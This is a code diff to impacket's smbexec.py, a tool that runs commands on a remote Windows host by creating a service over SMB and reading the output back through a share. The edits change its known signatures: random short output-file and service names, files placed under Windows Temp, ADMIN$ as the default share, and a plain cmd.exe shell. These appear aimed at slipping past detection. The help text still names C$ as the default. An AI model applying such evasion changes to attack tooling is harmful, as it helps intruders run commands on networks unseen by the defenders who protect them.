@@ -54,7 +54,7 @@ from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
-OUTPUT_FILENAME = '__output'
+OUTPUT_FILENAME = ''.join([random.choice(string.ascii_letters) for _ in range(5)])
 SMBSERVER_DIR   = '__tmp'
 DUMMY_SHARE     = 'TMP'
 CODEC = sys.stdout.encoding
@@ -138,7 +138,7 @@ class CMDEXEC:
             self.__lmhash, self.__nthash = hashes.split(':')
 
         if serviceName is None:
-            self.__serviceName = ''.join([random.choice(string.ascii_letters) for i in range(8)])
+            self.__serviceName = ''.join([random.choice(string.ascii_letters) for i in range(5)])
         else:
             self.__serviceName = serviceName
 
@@ -179,10 +179,10 @@ class RemoteShell(cmd.Cmd):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__mode = mode
-        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
+        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\Temp\\' + OUTPUT_FILENAME
         self.__outputBuffer = b''
         self.__command = ''
-        self.__shell = '%COMSPEC% /Q /c '
+        self.__shell = 'cmd.exe /Q /c, '
         self.__shell_type = shell_type
         self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
         self.__serviceName = serviceName
@@ -270,8 +270,8 @@ class RemoteShell(cmd.Cmd):
             self.__outputBuffer += data
 
         if self.__mode == 'SHARE':
-            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
-            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
+            self.transferClient.getFile(self.__share, '\\Temp\\' + OUTPUT_FILENAME, output_callback)
+            self.transferClient.deleteFile(self.__share, '\\Temp\\' + OUTPUT_FILENAME)
         else:
             fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'rb')
             output_callback(fd.read())
@@ -283,9 +283,9 @@ class RemoteShell(cmd.Cmd):
             data = '$ProgressPreference="SilentlyContinue";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
-        batchFile = '%SYSTEMROOT%\\' + ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.bat'
+        batchFile = '%WINDIR%\\Temp\\' + ''.join([random.choice(string.ascii_letters) for _ in range(5)]) + '.bat'
                 
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
+        command = self.__shell + 'echo ' + data + ' ^> %WINDIR%\\Temp\\' + OUTPUT_FILENAME + ' 2^>^&1  > ' + batchFile + ' & ' + \
                   self.__shell + batchFile
 
         if self.__mode == 'SERVER':
@@ -296,12 +296,12 @@ class RemoteShell(cmd.Cmd):
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                      lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
         service = resp['lpServiceHandle']
-
         try:
            scmr.hRStartServiceW(self.__scmr, service)
-        except:
+        except Exception as e:
            pass
         scmr.hRDeleteService(self.__scmr, service)
+
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output()
 
@@ -310,9 +310,6 @@ class RemoteShell(cmd.Cmd):
         try:
             print(self.__outputBuffer.decode(CODEC))
         except UnicodeDecodeError:
-            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
-                          'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
-                          'again with -codec and the corresponding codec')
             print(self.__outputBuffer.decode(CODEC, errors='replace'))
         self.__outputBuffer = b''
 
@@ -324,7 +321,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
-    parser.add_argument('-share', action='store', default = 'C$', help='share where the output will be grabbed from '
+    parser.add_argument('-share', action='store', default = 'ADMIN$', help='share where the output will be grabbed from '
                                                                        '(default C$)')
     parser.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE',
                         help='mode to use (default SHARE, SERVER needs root!)')
